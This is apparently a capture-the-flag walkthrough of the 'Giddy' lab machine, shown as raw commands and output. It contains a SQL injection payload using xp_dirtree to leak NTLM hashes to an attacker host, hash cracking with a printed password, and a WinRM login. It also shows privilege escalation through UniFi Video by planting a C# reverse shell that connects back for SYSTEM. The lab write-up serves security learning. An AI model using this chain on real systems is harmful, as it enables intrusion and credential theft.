### Initial access
Port scan
```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
443/tcp  open  ssl/https?
|_ssl-date: 2026-09-19T13:32:42+00:00; -1m18s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-06-16T21:28:55
| Not valid after:  2018-09-14T21:28:55
| MD5:     78a7 4af5 3b09 c882 a149 f977 cf8f 1182
| SHA-1:   8adc 3379 878a f13f 0154 406a 3ead d345 6967 6a23
|_SHA-256: 6bf4 0b16 1436 3b6a dc5b 8d5e 2395 b2b6 315c 384c 6b85 d4c1 4bd7 cf3a c2e3 6336
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2026-09-19T13:31:33+00:00
|_ssl-date: 2026-09-19T13:32:42+00:00; -1m18s from scanner time.
| ssl-cert: Subject: commonName=Giddy
| Issuer: commonName=Giddy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-18T13:23:37
| Not valid after:  2027-03-20T13:23:37
| MD5:     5bc2 fec0 6f0d 73a3 eba4 c514 7c05 e3c4
| SHA-1:   4cf6 621c 731b 15f4 77e5 456e 23d4 7302 17a3 70f6
|_SHA-256: 7cd9 577f eabc 0750 6ec6 6ac3 68af 4bf3 9bf4 82e4 06ad 30d2 b71a 0996 c175 8e5d
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
subdomain scan
dirscan
```bash
┌──(kali㉿kali)-[~/HTB/Giddy]
└─$ ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs


┌──(kali㉿kali)-[~/HTB/Giddy]
└─$ cat dirs | jq -r '.results[] | [.status, .url] | @tsv' | sort
301     http://10.129.96.140/aspnet_client
301     http://10.129.96.140/aspnet_Client
301     http://10.129.96.140/Aspnet_client
301     http://10.129.96.140/Aspnet_Client
301     http://10.129.96.140/ASPNET_CLIENT
301     http://10.129.96.140/aspnet_client/system_web
301     http://10.129.96.140/aspnet_Client/system_web
301     http://10.129.96.140/Aspnet_client/system_web
301     http://10.129.96.140/Aspnet_Client/system_web
301     http://10.129.96.140/ASPNET_CLIENT/system_web
301     http://10.129.96.140/mvc
301     http://10.129.96.140/mvc/account
301     http://10.129.96.140/mvc/Account
301     http://10.129.96.140/mvc/ACCOUNT
301     http://10.129.96.140/mvc/content
301     http://10.129.96.140/mvc/Content
301     http://10.129.96.140/mvc/CONTENT
301     http://10.129.96.140/mvc/images
301     http://10.129.96.140/mvc/Images
301     http://10.129.96.140/mvc/IMAGES
301     http://10.129.96.140/mvc/obj
301     http://10.129.96.140/mvc/Obj
301     http://10.129.96.140/mvc/properties
301     http://10.129.96.140/mvc/Properties
301     http://10.129.96.140/mvc/scripts
301     http://10.129.96.140/mvc/Scripts
301     http://10.129.96.140/mvc/SCRIPTS
302     http://10.129.96.140/remote
302     http://10.129.96.140/Remote

```
filescan

![[Assets/Pasted image 20260919203228.png]]

And we have `https://10.129.96.140/mvc/` which have sqli vul that we can dump cred the the sink point is in `https://10.129.96.140/mvc/Search.aspx` and it in  search box and it send  as post form. We use this payload to send it ro responder `'; EXEC master..xp_dirtree '\\10.10.17.47\share'--`

```Powershell
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:90811532e685edf8:57FA44B1E549CB8E48ACB643034A33CD:010100000000000080ADBF4F2348DD01A687C467051F3A3D0000000002000800560058003200390001001E00570049004E002D0055004200560048003700560039004B0041005A00370004003400570049004E002D0055004200560048003700560039004B0041005A0037002E0056005800320039002E004C004F00430041004C000300140056005800320039002E004C004F00430041004C000500140056005800320039002E004C004F00430041004C000700080080ADBF4F2348DD0106000400020000000800300030000000000000000000000000300000106FE91741A6F6B4C38DF80C082AEB03241A4BDC46BF7412F151D2764AE89AAB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E0034003700000000000000000000000000   
```

Crack the hash
```bash
┌──(kali㉿kali)-[~/HTB/Giddy]
└─$ john --format=NetNTLMv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)     
1g 0:00:00:00 DONE (2026-09-19 10:45) 1.724g/s 4639Kp/s 4639Kc/s 4639KC/s xamtrex..x215534x
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                       
```
We have cred `Stacy:xNnWo6272k7x`

```bash
┌──(kali㉿kali)-[~/HTB/Giddy]
└─$ nxc winrm  10.129.96.140  -u Stacy -p 'xNnWo6272k7x'  
WINRM       10.129.96.140   5985   GIDDY            [*] Windows 10 / Server 2016 Build 14393 (name:GIDDY) (domain:Giddy)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.96.140   5985   GIDDY            [+] Giddy\Stacy:xNnWo6272k7x (Pwn3d!)
┌──(kali㉿kali)-[~/HTB/Giddy]
└─$ evil-winrm -i  10.129.96.140  -u Stacy -p 'xNnWo6272k7x'     
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Stacy\Documents> ls



```

### Priv escalation
Recon the program folder
```bash {39}
*Evil-WinRM* PS C:\> ls C:\ -Force
 


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        6/16/2018   8:57 PM                $Recycle.Bin
d--hs-        9/19/2026   9:26 AM                Config.Msi
d--hsl         6/1/2018   6:02 PM                Documents and Settings
d-----        6/16/2018   9:07 PM                inetpub
d-----         6/1/2018   6:35 PM                PerfLogs
d-r---        9/19/2026   9:25 AM                Program Files
d-----        6/16/2018   9:22 PM                Program Files (x86)
d--h--        6/17/2018   9:24 AM                ProgramData
d--hs-        6/17/2018  12:55 AM                Recovery
d--hs-         6/1/2018   9:01 PM                System Volume Information
d-r---        6/16/2018   9:16 PM                Users
d-----        9/19/2026   9:26 AM                Windows
-arhs-        7/16/2016   9:18 AM         384322 bootmgr
-a-hs-        7/16/2016   9:18 AM              1 BOOTNXT
-a-hs-        9/19/2026  10:03 AM      823308288 pagefile.sys
*Evil-WinRM* PS C:\> cd ProgramData
*Evil-WinRM* PS C:\ProgramData> ls


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   9:23 AM                Comms
d---s-        6/16/2018   9:19 PM                Microsoft
d-----        9/19/2026   9:24 AM                Package Cache
d-----        8/18/2018   4:09 AM                regid.1991-06.com.microsoft
d-----        7/16/2016   9:23 AM                SoftwareDistribution
da----       12/15/2021   7:57 AM                unifi-video
d-----        7/16/2016   9:23 AM                USOPrivate
d-----         6/1/2018   6:03 PM                USOShared
da----         5/4/2021  10:56 AM                VMware
d-----        6/16/2018   9:16 PM                VsTelemetry


```
We see the unif-video which have cve  https://www.exploit-db.com/exploits/43390
Let exploit it (payload we use is C# tcp in revshell gen)
```powershell
*Evil-WinRM* PS C:\tmp> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:C:\ProgramData\unifi-video\taskkill.exe C:\tmp\exp.cs
Microsoft (R) Visual C# Compiler version 4.6.1586.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

exp.cs(64,34): warning CS0168: The variable 'err' is declared but never used
*Evil-WinRM* PS C:\tmp> ls C:\ProgramData\unifi-video\taskkill.exe -Force
 


    Directory: C:\ProgramData\unifi-video


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/19/2026  11:29 AM           5120 taskkill.exe

*Evil-WinRM* PS C:\tmp> Get-Service -Name UniFiVideoService
 

Status   Name               DisplayName
------   ----               -----------
Running  UniFiVideoService  Ubiquiti UniFi Video


*Evil-WinRM* PS C:\tmp> Restart-Service -Name UniFiVideoService


```

Root revshell

```bash
┌──(kali㉿kali)-[~/HTB/Giddy]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...

connect to [10.10.17.47] from (UNKNOWN) [10.129.96.140] 49714
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
PS C:\ProgramData\unifi-video> 
whoami
PS C:\ProgramData\unifi-video> whoami
nt authority\system



```